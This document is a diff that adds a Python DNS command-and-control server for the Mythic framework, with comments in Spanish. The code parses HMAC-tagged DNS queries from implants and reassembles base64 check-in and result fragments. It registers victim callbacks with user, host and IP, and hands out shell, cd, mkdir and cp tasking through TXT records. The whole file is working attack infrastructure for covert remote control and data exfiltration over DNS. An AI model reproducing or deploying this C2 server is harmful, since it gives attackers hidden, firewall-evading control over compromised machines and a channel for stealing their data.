@@ -1,0 +1,294 @@
+#!/usr/bin/env python3
+import sys
+sys.path.insert(0, "/Mythic")
+
+import asyncio
+import json
+import threading
+import hmac
+import hashlib
+import logging
+import json
+
+from base64 import urlsafe_b64decode
+from dnslib import TXT, RR
+from dnslib.server import DNSServer
+from dns.c2_functions.MythicCallbackRPCAux import MythicCallbackRPCAux
+
+# ——— Logging básico ———
+logging.basicConfig(
+    filename="/tmp/mythic_rpc.log",
+    level=logging.DEBUG,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+)
+logger = logging.getLogger()
+for lib in ("pamqp", "pika", "aio_pika", "aiormq"):
+    logging.getLogger(lib).setLevel(logging.WARNING)
+
+class OnlyMyLogsFilter(logging.Filter):
+    EXCLUDE_PREFIXES = ("pamqp", "pika", "aio_pika", "aiormq")
+    ALLOWED_LEVELS   = (logging.DEBUG, logging.INFO, logging.CRITICAL)
+    def filter(self, record):
+        for p in self.EXCLUDE_PREFIXES:
+            if record.name.startswith(p):
+                return False
+        if record.levelno in self.ALLOWED_LEVELS:
+            record.levelno   = logging.INFO
+            record.levelname = "INFO"
+            return True
+        return False
+
+for h in logger.handlers:
+    h.addFilter(OnlyMyLogsFilter())
+logger.setLevel(logging.DEBUG)
+
+def pad_b64(s: str) -> str:
+    return s + "=" * (-len(s) % 4)
+
+class AgentCon:
+    def __init__(self, channel):
+        self.channel         = channel
+        self.client_queue    = {}
+        self.init_seq        = None
+        self.result_queue    = {}
+        self.result_base     = None
+        self.current_task_id = None
+        self.uuid            = None
+        self.callback_id     = None
+        self.callback_uuid   = None
+
+    def add_fragment(self, data, seq):
+        pid = seq - self.init_seq
+        self.client_queue[pid] = data
+
+    def reassemble(self):
+        return "".join(self.client_queue[i] for i in sorted(self.client_queue))
+
+    def add_result_fragment(self, data, seq):
+        if self.result_base is None:
+            self.result_base = seq
+        pid = seq - self.result_base
+        self.result_queue[pid] = data
+
+    def reassemble_result(self):
+        return "".join(self.result_queue[i] for i in sorted(self.result_queue))
+
+
+class Resolver:
+    def __init__(self, cfg, rpc, loop):
+        self.config = cfg
+        self.rpc    = rpc
+        self.loop   = loop
+        self.agents = {}
+        self.lock   = threading.Lock()
+
+    def resolve(self, request, handler):
+        q = str(request.questions[0].qname).rstrip(".")
+        inst, dom = self._match(q)
+        if inst is None:
+            return self._txtvers(request)
+
+        prefix, tsid, data, mac = self._parse(q, dom)
+        # Validar HMAC…
+        key    = self.config[inst]["key"]
+        to_mac = tsid if data == "" else tsid + data
+        if hmac.new(key.encode(), to_mac.encode(), hashlib.md5).hexdigest() != mac:
+            return self._txtvers(request)
+
+        channel = int(tsid[:2], 16)
+        seq     = int(tsid[2:], 16)
+        agent   = self.agents.get(channel)
+
+        # ——— CHECK-IN ———
+        if prefix == self.config[inst]["msginit"]:
+            with self.lock:
+                if agent is None:
+                    agent = AgentCon(channel)
+                    self.agents[channel] = agent
+            if agent.init_seq is None:
+                agent.init_seq = seq
+            agent.add_fragment(data, seq)
+            assembled = agent.reassemble()
+            try:
+                info = json.loads( urlsafe_b64decode(pad_b64(assembled)).decode() )
+                agent.uuid = info["uuid"]
+                threading.Thread(
+                    target=self._register_callback, args=(agent, info), daemon=True
+                ).start()
+                agent.client_queue.clear()
+            except:
+                pass
+            reply = request.reply()
+            reply.add_answer(RR(q, request.q.qtype, rdata=TXT("ACK")))
+            return reply
+
+        # ——— TASKING & RESULT (“dash”) ———
+        if prefix == self.config[inst]["msgdefault"]:
+            # Si es fragmento de resultado
+            if data:
+                logger.info(f"[Agent {channel}] RESULT seq={seq} data={data!r}")
+                # Si es el marcador final
+                if data == "END":
+                    full_b64 = agent.reassemble_result()
+                    try:
+                        decoded  = urlsafe_b64decode(pad_b64(full_b64))
+                        text_out = decoded.decode(errors="ignore")
+                        # 1) buscar task_db_id
+                        ts = asyncio.run_coroutine_threadsafe(
+                            self.rpc.task_search(agent.callback_id), self.loop
+                        ).result(timeout=30)
+                        task_db_id = next(
+                            (t["id"] for t in ts.data.get("tasks", [])
+                             if t["agent_task_id"] == agent.current_task_id),
+                            None
+                        )
+                        if task_db_id:
+                            # 2) enviar a Mythic
+                            payload = {
+                                "action": "post_response",
+                                "responses": [{
+                                    "task_id":     agent.current_task_id,
+                                    "user_output": text_out,
+                                    "completed":   True
+                                }]
+                            }
+                            rc = asyncio.run_coroutine_threadsafe(
+                                self.rpc.handle_agent_message_json(
+                                    agent_callback_id=agent.callback_uuid,
+                                    c2_profile="dns",
+                                    payload_type="dns-agent",
+                                    message=payload
+                                ), self.loop
+                            ).result(timeout=30)
+                            logger.info(f"[Agent {channel}] post_response → {rc.raw}")
+                    except Exception as e:
+                        logger.error(f"[Agent {channel}] fallo procesando END: {e}")
+                    finally:
+                        agent.result_queue.clear()
+                        agent.result_base = None
+                else:
+                    # Fragmento intermedio
+                    agent.add_result_fragment(data, seq)
+
+                # ACK a cada fragmento (intermedio o END)
+                reply = request.reply()
+                reply.add_answer(RR(q, request.q.qtype, rdata=TXT("ACK")))
+                return reply
+
+            # Si es petición de tasking
+            resp = asyncio.run_coroutine_threadsafe(self.rpc.checkin_get_tasking(agent.callback_uuid), self.loop).result(timeout=30)
+            tasks = resp.data.get("agent_response", {}).get("tasks", [])
+            if tasks:
+                task       = tasks[0]
+                cmd        = task.get("command", "")
+                tid        = task.get("id")
+                raw_params = task.get("parameters", "")  # viene como JSON string
+                agent.current_task_id = tid
+            
+                # Construir la orden con sus parámetros
+                actual_cmd = cmd
+                if raw_params:
+                    try:
+                        params = json.loads(raw_params)
+                        if cmd == "shell":
+                            arg = params.get("cmd", "")
+                        elif cmd in ("cd", "mkdir"):
+                            arg = params.get("directory", "")
+                        elif cmd == "cp":
+                            src = params.get("source", "")
+                            dst = params.get("destination", "")
+                            arg = f"{src} {dst}"
+                        else:
+                            arg = ""
+                        # concatenamos sólo si tenemos un argumento no vacío
+                        if arg:
+                            actual_cmd = f"{cmd} {arg}"
+                    except Exception as e:
+                        logger.warning(f"[Agent {channel}] No pude parsear parámetros de {cmd}: {e}")
+            
+                frag = f"{tid}:{actual_cmd}"
+            else:
+                frag = "ACK"
+
+            reply = request.reply()
+            reply.add_answer(RR(q, request.q.qtype, rdata=TXT(frag)))
+            logger.info(f"[Agent {channel}] Replying to TASKING seq={seq} with → {frag!r}")
+            return reply
+
+        return self._txtvers(request)
+
+
+    def _register_callback(self, agent, info):
+        logger.info(f"[Agent {agent.channel}] Registering callback…")
+        coro = self.rpc.create_callback(
+            info["ip"], info["user"], info["host"], info["pid"],
+            info["os"], info["architecture"], info["description"],
+            info["extra_info"], info["sleep_info"], info["uuid"],
+        )
+        fut = asyncio.run_coroutine_threadsafe(coro, self.loop)
+        try:
+            res = fut.result(timeout=30)
+            agent.callback_id   = res.data["callback_id"]
+            agent.callback_uuid = res.data["callback_uuid"]
+            logger.info(
+                f"[Agent {agent.channel}] Registered callback_id={agent.callback_id}, "
+                f"callback_uuid={agent.callback_uuid}"
+            )
+        except Exception as e:
+            logger.error(f"[Agent {agent.channel}] create_callback failed: {e}", exc_info=True)
+
+    def _match(self, q):
+        for i, inst in self.config.items():
+            for d in inst["domains"].split(","):
+                if q.endswith(d):
+                    return i, d
+        return None, None
+
+    def _parse(self, q, d):
+        base  = q[: -len(d) - 1]
+        parts = [p for p in base.split(".") if p]
+        if len(parts) == 4:
+            return parts
+        if len(parts) == 3:
+            return parts[0], parts[1], "", parts[2]
+        raise ValueError("wrong number of labels")
+
+    def _txtvers(self, req):
+        r = req.reply()
+        r.add_answer(*RR.fromZone('0.0.0.0 60 IN TXT "txtvers=1"'))
+        return r
+
+
+async def main():
+    print("[*] Conectando a RabbitMQ…")
+    rpc  = MythicCallbackRPCAux()
+    await rpc.connect()
+    print("[+] Conectado a Mythic RPC")
+    logger.info("Connected to Mythic RPC")
+
+    with open("config.json") as f:
+        cfg = json.load(f)
+    instances = {
+        idx: {
+            "domains"   : inst["domains"],
+            "key"       : inst["key"],
+            "msginit"   : inst["msginit"],
+            "msgdefault": inst["msgdefault"],
+        }
+        for idx, inst in enumerate(cfg["instances"])
+    }
+
+    loop     = asyncio.get_running_loop()
+    resolver = Resolver(instances, rpc, loop)
+    server   = DNSServer(resolver, port=53, address="0.0.0.0")
+    server.start_thread()
+    logger.info("DNS C2 listening on 0.0.0.0:53")
+
+    try:
+        while True:
+            await asyncio.sleep(1)
+    except asyncio.CancelledError:
+        logger.info("Shutting down…")
+
+if __name__ == "__main__":
+    asyncio.run(main())
